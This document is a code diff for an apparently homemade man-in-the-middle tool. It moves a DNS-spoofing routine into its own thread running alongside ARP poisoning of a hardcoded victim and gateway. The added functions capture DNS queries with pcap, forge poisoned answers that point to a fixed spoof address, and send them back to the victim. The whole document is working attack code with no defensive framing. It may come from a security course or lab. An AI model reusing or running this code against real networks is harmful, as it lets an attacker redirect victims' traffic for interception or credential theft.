@@ -11,6 +11,10 @@
 
 #include "dns.h"
 
+void dnsSpoof(NetworkEngine *net);
+void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
+                  const unsigned char *packet);
+
 // get the interface name, ip of gateway and ip of victim
 // main program we need: interface name, ip of gateway, ip of victim
 // dns poison we need: domain to poison, what to poison too
@@ -29,10 +33,6 @@ int main(int argc, const char *argv[]) {
     struct arp_header gatewayArp;
     struct arp_header arpRequestVictim;
     struct arp_header arpRequestGateway;
-
-    // tmp fake spoofing address
-    struct in_addr spoofIp;
-    spoofIp.s_addr = 0x1300a8c0;
 
     victimIp.s_addr = 0x1400a8c0;
     gatewayIp.s_addr = 0x6400a8c0;
@@ -102,49 +102,8 @@ int main(int argc, const char *argv[]) {
     }
 
     // start dns sniffing
-    ipEngine.LoopCallbacks.clear();
-    ipEngine.LoopCallbacks.push_back([&](const struct pcap_pkthdr *header,
-                                         const unsigned char *packet) {
-        UCharVector buffer(1500, 0);
-        struct iphdr *ip;
-        struct udphdr *udp;
-        dnshdr *dns;
-
-        int ipLen = 0;
-        int udpLen = 0;
-        int dnsLen = 0;
-
-        // get ip hdr size
-        ip = (iphdr *)(packet + 14);
-        ipLen = ip->ihl * 4;
-
-        // get udp hdr and size
-        udp = (udphdr *)(packet + 14 + ipLen);
-        udpLen = UdpStack::UDP_HDR_LEN;
-
-        // get dns header
-        dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
-
-        std::cout << "dns packet received" << std::endl;
-
-        // craft the poisoned response
-        int responseSize = forgeDns(dns, &spoofIp, buffer.data());
-        buffer.resize(responseSize);
-
-        struct in_addr originalSrc;
-        struct in_addr originalDst;
-
-        originalSrc.s_addr = ip->saddr;
-        originalDst.s_addr = ip->daddr;
-
-        std::cout << "craft a response with size: " << buffer.size() << std::endl;
-
-        // reply
-        ipEngine.sendUdp(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
-        std::cout << "sending reply" << std::endl;
-    });
     std::cout << "starting dns sniff" << std::endl;
-    ipEngine.startSniff("udp and dst port domain");
+    std::thread dnsThread(dnsSpoof, &ipEngine);
     std::cout << "dns sniffing started" << std::endl;
 
     // start arp poisoning
@@ -157,5 +116,93 @@ int main(int argc, const char *argv[]) {
         sleep(5);
     }
 
+    dnsThread.join();
     return 0;
+}
+
+void dnsSpoof(NetworkEngine *net) {
+    int i;
+
+    pcap_t *session;
+    pcap_if_t *allDevs;
+    pcap_if_t *temp;
+
+    struct bpf_program filterProgram;
+    bpf_u_int32 netAddr = 0;
+
+    char errBuff[PCAP_ERRBUF_SIZE];
+
+    if (pcap_findalldevs(&allDevs, errBuff) == -1) {
+        std::cerr << "pcap_findallDevs: " << errBuff << std::endl;
+        return;
+    }
+
+    for (i = 0, temp = allDevs; temp; temp = temp->next, ++i) {
+        if (!(temp->flags & PCAP_IF_LOOPBACK)) {
+            break;
+        }
+    }
+
+    session = pcap_open_live(temp->name, BUFSIZ, 0, 1, errBuff);
+    if (!session) {
+        std::cerr << "Could not open device: " << errBuff << std::endl;
+        return;
+    }
+
+    if (pcap_compile(session, &filterProgram, "udp and dst port domain", 0, netAddr)) {
+        std::cerr << "Error calling pcap_compile" << std::endl;
+        return;
+    }
+
+    if (pcap_setfilter(session, &filterProgram) == -1) {
+        std::cerr << "Error setting filter" << std::endl;
+        return;
+    }
+
+    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)net);
+
+    pcap_freealldevs(allDevs);
+}
+
+void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
+                  const unsigned char *packet) {
+    NetworkEngine *net = (NetworkEngine *)args;
+    // tmp fake spoofing address
+    struct in_addr spoofIp;
+    spoofIp.s_addr = 0x1300a8c0;
+
+    UCharVector buffer(1500, 0);
+    struct iphdr *ip;
+    struct udphdr *udp;
+    dnshdr *dns;
+
+    int ipLen = 0;
+
+    // get ip hdr size
+    ip = (iphdr *)(packet + 14);
+    ipLen = ip->ihl * 4;
+
+    // get udp hdr and size
+    udp = (udphdr *)(packet + 14 + ipLen);
+
+    // get dns header
+    dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
+
+    std::cout << "dns packet received" << std::endl;
+
+    // craft the poisoned response
+    int responseSize = forgeDns(dns, &spoofIp, buffer.data());
+    buffer.resize(responseSize);
+
+    struct in_addr originalSrc;
+    struct in_addr originalDst;
+
+    originalSrc.s_addr = ip->saddr;
+    originalDst.s_addr = ip->daddr;
+
+    std::cout << "craft a response with size: " << buffer.size() << std::endl;
+
+    // reply
+    net->sendUdp(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
+    std::cout << "sending reply" << std::endl;
 }
